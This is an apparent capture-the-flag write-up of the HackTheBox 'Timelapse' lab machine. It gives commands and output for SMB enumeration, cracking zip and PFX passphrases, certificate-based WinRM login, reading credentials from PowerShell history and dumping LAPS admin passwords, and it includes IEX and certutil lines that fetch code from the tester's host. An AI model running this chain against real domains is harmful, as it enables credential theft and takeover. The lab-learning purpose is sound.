---
description: >-
  Timelapse HTB Machine
title: Timelapse (Easy)                # Add title here
date: 2023-02-06 08:00:00 -0600                           # Change the date to match completion date
categories: [HackTheBox, Windows - Easy]                     # Change Templates to Writeup
tags: [hackthebox, windows, timelapse, kerberos, smb, ntp, pfx certificate, evil-winrm, powershell, history, information leakage, laps_reader]     # TAG names should always be lowercase; replace template with writeup, and add relevant tags
show_image_post: true                                    # Change this to true
image: /assets/img/icons/Timelapse.png                # Add infocard image here for post preview image
---
### Host entries
```bash
10.10.11.152    dc01.timelapse.htb timelapse.htb
```
If Active Directory => [NTP Synchronization](https://shuciran.github.io/posts/NTP-Synchronization/) with the domain controller.

### Content

- Kerberos enumeration
- RPC Enumeration
- SMB Enumeration
- NTP Enumeration
- Certificate & Private Key extracted from PFX
- Access with certificate & Private Key via winrm (evil-winrm)
- Powershell History hardcoded credentials
- Abusing of LAPS_Reader group to dump LAPS credentials.

### Reconnaissance

Initial reconnaissance for TCP ports
```bash
nmap -p- -sS --open --min-rate 5000 -Pn -n -vvv -oG allPorts 10.10.11.152
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.11.152 ()   Status: Up
Host: 10.10.11.152 ()   Ports: 53/open/tcp//domain///, 88/open/tcp//kerberos-sec///, 135/open/tcp//msrpc///, 139/open/tcp//netbios-ssn///, 389/open/tcp//ldap///, 445/open/tcp//microsoft-ds///, 464/open/tcp//kpasswd5///, 593/open/tcp//http-rpc-epmap///, 636/open/tcp//ldapssl///, 3268/open/tcp//globalcatLDAP///, 3269/open/tcp//globalcatLDAPssl///, 5986/open/tcp//wsmans///, 9389/open/tcp//adws///, 49667/open/tcp/////, 49673/open/tcp/////, 49674/open/tcp/////, 49692/open/tcp/////, 49700/open/tcp/////
```
Services and Versions running:
```bash
nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5986,9389,49667,49673,49674,49692,49700 -sCV -Pn -n -vvv -oN targeted 10.10.11.152
Nmap scan report for 10.10.11.152
Host is up, received user-set (0.098s latency).
Scanned at 2023-02-06 18:48:02 GMT for 105s

PORT      STATE SERVICE           REASON          VERSION
53/tcp    open  domain            syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec      syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2023-02-07 02:48:08Z)
135/tcp   open  msrpc             syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn       syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap              syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?     syn-ack ttl 127
464/tcp   open  kpasswd5?         syn-ack ttl 127
593/tcp   open  ncacn_http        syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?          syn-ack ttl 127
3268/tcp  open  ldap              syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl? syn-ack ttl 127
5986/tcp  open  ssl/http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| ssl-cert: Subject: commonName=dc01.timelapse.htb
| Issuer: commonName=dc01.timelapse.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-10-25T14:05:29
| Not valid after:  2022-10-25T14:25:29
| MD5:   e233a19945040859013fb9c5e4f691c3
| SHA-1: 5861acf776b8703fd01ee25dfc7c9952a4477652
| -----BEGIN CERTIFICATE-----
...
|_-----END CERTIFICATE-----
|_ssl-date: 2023-02-07T02:49:42+00:00; +7h59m59s from scanner time.
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
| tls-alpn: 
|_  http/1.1
9389/tcp  open  mc-nmf            syn-ack ttl 127 .NET Message Framing
49667/tcp open  msrpc             syn-ack ttl 127 Microsoft Windows RPC
49673/tcp open  ncacn_http        syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc             syn-ack ttl 127 Microsoft Windows RPC
49692/tcp open  msrpc             syn-ack ttl 127 Microsoft Windows RPC
49700/tcp open  msrpc             syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h59m58s, deviation: 0s, median: 7h59m57s
| smb2-time: 
|   date: 2023-02-07T02:49:05
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 26636/tcp): CLEAN (Timeout)
|   Check 2 (port 32357/tcp): CLEAN (Timeout)
|   Check 3 (port 39584/udp): CLEAN (Timeout)
|   Check 4 (port 22941/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
```
UDP open ports:
```bash
extractUDPPorts allUDPPorts

[*] Extracting information...

        [*] IP Address: 10.10.11.152
        [*] Open ports: 53,123
```
Kerberos enumeration throws no users valid:
```bash
kerbrute userenum -d timelapse.htb --dc 10.10.11.152 /usr/share/seclists/Kerberos/A-Z.Surnames.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 02/06/23 - Ronnie Flathers @ropnop

2023/02/06 19:03:29 >  Using KDC(s):
2023/02/06 19:03:29 >   10.10.11.152:88

2023/02/06 19:08:24 >  Done! Tested 13000 usernames (0 valid) in 295.327 seconds
```
RPC Enumeration, only the SID of the Doman can be extracted (helpful for Silver Ticket Attack):
```bash
rpcclient $> lsaquery
Domain Name: TIMELAPSE
Domain Sid: S-1-5-21-671920749-559770252-3318990721
```
Nothing interesting on Netbios (tcp-139) port:
```bash
nbtscan -r 10.10.11.152        
Doing NBT name scan for addresses from 10.10.11.152

IP address       NetBIOS Name     Server    User             MAC address      
------------------------------------------------------------------------------
```
LDAP Enumeration[^ldap-enumeration] with nmap (nothing interesting):
```bash
nmap -sT -Pn -n --open 10.10.11.152 -p389 --script ldap-rootdse
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-06 19:38 GMT
Nmap scan report for 10.10.11.152
Host is up (0.37s latency).

PORT    STATE SERVICE
389/tcp open  ldap
| ldap-rootdse: 
| LDAP Results
|   <ROOT>
|       domainFunctionality: 7
|       forestFunctionality: 7
|       domainControllerFunctionality: 7
|       rootDomainNamingContext: DC=timelapse,DC=htb
|       ldapServiceName: timelapse.htb:dc01$@TIMELAPSE.HTB
|       isGlobalCatalogReady: TRUE
|       supportedSASLMechanisms: GSSAPI
|       supportedSASLMechanisms: GSS-SPNEGO
|       supportedSASLMechanisms: EXTERNAL
|       supportedSASLMechanisms: DIGEST-MD5
|       supportedLDAPVersion: 3
|       supportedLDAPVersion: 2
|       supportedLDAPPolicies: MaxPoolThreads
|       supportedLDAPPolicies: MaxPercentDirSyncRequests
|       supportedLDAPPolicies: MaxDatagramRecv
|       supportedLDAPPolicies: MaxReceiveBuffer
|       supportedLDAPPolicies: InitRecvTimeout
|       supportedLDAPPolicies: MaxConnections
|       supportedLDAPPolicies: MaxConnIdleTime
|       supportedLDAPPolicies: MaxPageSize
|       supportedLDAPPolicies: MaxBatchReturnMessages
|       supportedLDAPPolicies: MaxQueryDuration
|       supportedLDAPPolicies: MaxDirSyncDuration
|       supportedLDAPPolicies: MaxTempTableSize
|       supportedLDAPPolicies: MaxResultSetSize
|       supportedLDAPPolicies: MinResultSets
|       supportedLDAPPolicies: MaxResultSetsPerConn
|       supportedLDAPPolicies: MaxNotificationPerConn
|       supportedLDAPPolicies: MaxValRange
|       supportedLDAPPolicies: MaxValRangeTransitive
|       supportedLDAPPolicies: ThreadMemoryLimit
|       supportedLDAPPolicies: SystemMemoryLimitPercent
|       supportedControl: 1.2.840.113556.1.4.319
|       supportedControl: 1.2.840.113556.1.4.801
|       supportedControl: 1.2.840.113556.1.4.473
|       supportedControl: 1.2.840.113556.1.4.528
|       supportedControl: 1.2.840.113556.1.4.417
|       supportedControl: 1.2.840.113556.1.4.619
|       supportedControl: 1.2.840.113556.1.4.841
|       supportedControl: 1.2.840.113556.1.4.529
|       supportedControl: 1.2.840.113556.1.4.805
|       supportedControl: 1.2.840.113556.1.4.521
|       supportedControl: 1.2.840.113556.1.4.970
|       supportedControl: 1.2.840.113556.1.4.1338
|       supportedControl: 1.2.840.113556.1.4.474
|       supportedControl: 1.2.840.113556.1.4.1339
|       supportedControl: 1.2.840.113556.1.4.1340
|       supportedControl: 1.2.840.113556.1.4.1413
|       supportedControl: 2.16.840.1.113730.3.4.9
|       supportedControl: 2.16.840.1.113730.3.4.10
|       supportedControl: 1.2.840.113556.1.4.1504
|       supportedControl: 1.2.840.113556.1.4.1852
|       supportedControl: 1.2.840.113556.1.4.802
|       supportedControl: 1.2.840.113556.1.4.1907
|       supportedControl: 1.2.840.113556.1.4.1948
|       supportedControl: 1.2.840.113556.1.4.1974
|       supportedControl: 1.2.840.113556.1.4.1341
|       supportedControl: 1.2.840.113556.1.4.2026
|       supportedControl: 1.2.840.113556.1.4.2064
|       supportedControl: 1.2.840.113556.1.4.2065
|       supportedControl: 1.2.840.113556.1.4.2066
|       supportedControl: 1.2.840.113556.1.4.2090
|       supportedControl: 1.2.840.113556.1.4.2205
|       supportedControl: 1.2.840.113556.1.4.2204
|       supportedControl: 1.2.840.113556.1.4.2206
|       supportedControl: 1.2.840.113556.1.4.2211
|       supportedControl: 1.2.840.113556.1.4.2239
|       supportedControl: 1.2.840.113556.1.4.2255
|       supportedControl: 1.2.840.113556.1.4.2256
|       supportedControl: 1.2.840.113556.1.4.2309
|       supportedControl: 1.2.840.113556.1.4.2330
|       supportedControl: 1.2.840.113556.1.4.2354
|       supportedCapabilities: 1.2.840.113556.1.4.800
|       supportedCapabilities: 1.2.840.113556.1.4.1670
|       supportedCapabilities: 1.2.840.113556.1.4.1791
|       supportedCapabilities: 1.2.840.113556.1.4.1935
|       supportedCapabilities: 1.2.840.113556.1.4.2080
|       supportedCapabilities: 1.2.840.113556.1.4.2237
|       subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=timelapse,DC=htb
|       serverName: CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=timelapse,DC=htb
|       schemaNamingContext: CN=Schema,CN=Configuration,DC=timelapse,DC=htb
|       namingContexts: DC=timelapse,DC=htb
|       namingContexts: CN=Configuration,DC=timelapse,DC=htb
|       namingContexts: CN=Schema,CN=Configuration,DC=timelapse,DC=htb
|       namingContexts: DC=DomainDnsZones,DC=timelapse,DC=htb
|       namingContexts: DC=ForestDnsZones,DC=timelapse,DC=htb
|       isSynchronized: TRUE
|       highestCommittedUSN: 131176
|       dsServiceName: CN=NTDS Settings,CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=timelapse,DC=htb
|       dnsHostName: dc01.timelapse.htb
|       defaultNamingContext: DC=timelapse,DC=htb
|       currentTime: 20230207033838.0Z
|_      configurationNamingContext: CN=Configuration,DC=timelapse,DC=htb
Service Info: Host: DC01; OS: Windows
```
SMB Enumeration, following shares available:
```bash
crackmapexec smb 10.10.11.152 -u 'guest' -p '' --shares                    
SMB 10.10.11.152 445 DC01 [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)
SMB 10.10.11.152 445 DC01 [+] timelapse.htb\guest: 
SMB 10.10.11.152 445 DC01 [+] Enumerated shares
SMB 10.10.11.152 445 DC01 SharePermissions Remark
SMB 10.10.11.152 445 DC01 ---------------- ------
SMB 10.10.11.152 445 DC01 ADMIN$ Remote Admin
SMB 10.10.11.152 445 DC01 C$ Default share
SMB 10.10.11.152 445 DC01 IPC$ READ Remote IPC
SMB 10.10.11.152 445 DC01 NETLOGON Logon server share 
SMB 10.10.11.152 445 DC01 Shares  READ 
SMB 10.10.11.152 445 DC01 SYSVOL Logon server share
```
Inside the `Shares` share we are able to get some files:
```bash
# Dev directory
smb: \Dev\> dir
  winrm_backup.zip                    A     2611  Mon Oct 25 15:46:42 2021
# Help Desk directory
smb: \HelpDesk\> dir
 LAPS.x64.msi A 1118208 Mon Oct 25 14:57:50 2021
 LAPS_Datasheet.docx A 104422 Mon Oct 25 14:57:46 2021
 LAPS_OperationsGuide.docx A 641378 Mon Oct 25 14:57:40 2021
 LAPS_TechnicalSpecification.docx A 72683 Mon Oct 25 14:57:44
```

### Exploitation

The .zip file is password protected, so we extract its hash with zip2john and then proceed to crack it with hashcat[^pfx-certificate]: 
```bash
zip2john winrm_backup.zip 
ver 2.0 efh 5455 efh 7875 winrm_backup.zip/legacyy_dev_auth.pfx PKZIP Encr: TS_chk, cmplen=2405, decmplen=2555, crc=12EC5683 ts=72AA cs=72aa type=8
winrm_backup.zip/legacyy_dev_auth.pfx:$pkzip$1*1*2*0*965*9fb*12ec5683*0*4e*8*965*72aa*1a84b40ec6b5c20abd7d695aa16d8c88a3cec7243a...
40c7d3df38fc5da2c1a255ff8c9e344761a397d2c2d59d722723d27140c6830563ee783156404a17e2f7b7e506452f76*$/pkzip$:legacyy_dev_auth.pfx:winrm_backup.zip::winrm_backup.zip
```
Hashcat output:
```bash
D:\Programs\hashcat-6.2.5>hashcat.exe -m 17220 -a 0 hash.txt rockyou.txt
supremelegacy
```
The .pfx file is also password protected:
```bash
pfx2john legacyy_dev_auth.pfx   
legacyy_dev_auth.pfx:$pfxng$1$20$2000$20$eb755568327396de179c4a5...
45b03465a6ce0c974055e6dcc74f0e893:::::legacyy_dev_auth.pfx
```
Let's decrypt it with `john`:
```bash
pfx2john legacyy_dev_auth.pfx | john /dev/stdin --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Press Ctrl-C to abort, or send SIGUSR1 to john process for status
thuglegacy       (legacyy_dev_auth.pfx)
```
Now that we get the passphrase for the PFX certificate, we need to extract its content. Searching on the Internet, we find this guide [How to Extract Certificate and Private Key from PFX](https://tecadmin.net/extract-private-key-and-certificate-files-from-pfx-file/) basically we need to run two commands:
```bash
# Extract the public certificate
openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out publicCert.pem               
# Extract the private key (don't forget to use the .pfx passphrase)
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out priv-key.pem -nodes  
Enter Import Password:
```
Now that we get this two files, we can proceed to access the machine:
```bash
evil-winrm -i 10.10.11.152 -c publicCert.pem -k priv-key.pem -S 
```
### Privilege Escalation
It was not possible to upload SharpHound.exe nor SharpHound.ps1
```powershell
*Evil-WinRM* PS C:\WIndows\Temp\PrivEsc> certutil -urlcache -f http://10.10.14.3/SharpHound.exe SharpHound.exe
At line:1 char:1
+ certutil -urlcache -f http://10.10.14.3/SharpHound.exe SharpHound.exe
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
```
First step is to enumerate manually our user:
```powershell
*Evil-WinRM* PS C:\WIndows\Temp\PrivEsc> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```
No special privileges that could lead to a PrivEsc, it is not possible to run wmic either:
```powershell
*Evil-WinRM* PS C:\WIndows\Temp\PrivEsc> wmic process list brief
WMIC.exe : ERROR:
Description = Access denied
*Evil-WinRM* PS C:\WIndows\Temp\PrivEsc> wmic computersystem list
WMIC.exe : ERROR:
Description = Access denied
```
A good technique for privilege escalation on Windows is to read the [Powershell History](https://shuciran.github.io/posts/Powershell-History/)[^powershell-history] located in the PATH:  
```powershell
C:\Users\<Username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```
In this case, we found some credentials in clear text on the history:
```powershell
*Evil-WinRM* PS C:\Users\legacyy> type AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
```
We can use this credentials to access to the machine as the user svc_deploy:
```powershell
evil-winrm -i 10.10.11.152 -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S
*Evil-WinRM* PS C:\Users\svc_deploy\Documents>
```
Now is time to enumerate this user's permissions:
```powershell
*Evil-WinRM* PS C:\Uwhoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

No special permissions, let's enumerate our groups:
```bash
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> net user svc_deploy
User name                    svc_deploy
Full Name                    svc_deploy
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/25/2021 11:12:37 AM
Password expires             Never
Password changeable          10/26/2021 11:12:37 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   2/6/2023 9:25:55 PM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *LAPS_Readers         *Domain Users
The command completed successfully.
```
Now this is interesting, we are part of a group called "LAPS_Readers"; a good search about that group could lead us to something interesting, a good article about [Dumping LAPS](https://www.hackingarticles.in/credential-dumpinglaps/) such article give us a reference to the [Get-LAPSPasswords.ps1](https://raw.githubusercontent.com/kfosaaen/Get-LAPSPasswords/master/Get-LAPSPasswords.ps1)[^Get-LAPSPasswords] which is worth to check:
```powershell
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.3/Get-LAPSPasswords.ps1')
```
Then by reading the exploit, we find that the Powershell module can be executed as follows:
```powershell
Hostname   : dc01.timelapse.htb
Stored     : 1
Readable   : 1
Password   : d2s(09pQNZ.}Q.db5,m-drS2
Expiration : 2/11/2023 6:35:44 PM
```
### Post Exploitation
Another technique to retrieve LAPS[^readlapspassword] passwords is by using the [Laps.py](https://github.com/n00py/LAPSDumper):
```bash
python3 laps.py -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -d timelapse.htb
LAPS Dumper - Running at 06-02-2023 04:44:09
DC01 d2s(09pQNZ.}Q.db5,m-drS2
```

### Credentials
```bash
# winrm_backup.zip password
supremelegacy
# legacyy_dev_auth.pfx
thuglegacy
# Credentials for user svc_deploy
svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV
# Credentials for administrator
administrator:d2s(09pQNZ.}Q.db5,m-drS2
```
### Notes

- Evil-winrm can be used to authenticate with certificates, also is worth noting that if we want to authenticate via SSL we need to add the (-S) flag
- Always lookup for hardcoded passwords on files specially on powershell history.
- To check if we  have read access to an SMB share we need to use the `--shares` with crackmapexec or to use SMBMAP not only with SMBClient to be sure.

### References

- [How to Extract Certificate and Private Key from PFX](https://tecadmin.net/extract-private-key-and-certificate-files-from-pfx-file/)
- [Dumping LAPS](https://www.hackingarticles.in/credential-dumpinglaps/) 
- [Get-LAPSPasswords.ps1](https://raw.githubusercontent.com/kfosaaen/Get-LAPSPasswords/master/Get-LAPSPasswords.ps1) 

[^Get-LAPSPasswords]: Powershell Utility to read LAPS passwords
[^readlapspassword]: Python utility to read LAPS passwords
[^pfx-certificate]: PFX Certificate login
[^ldap-enumeration]: LDAP Enumeration
[^powershell-history]: Powershell History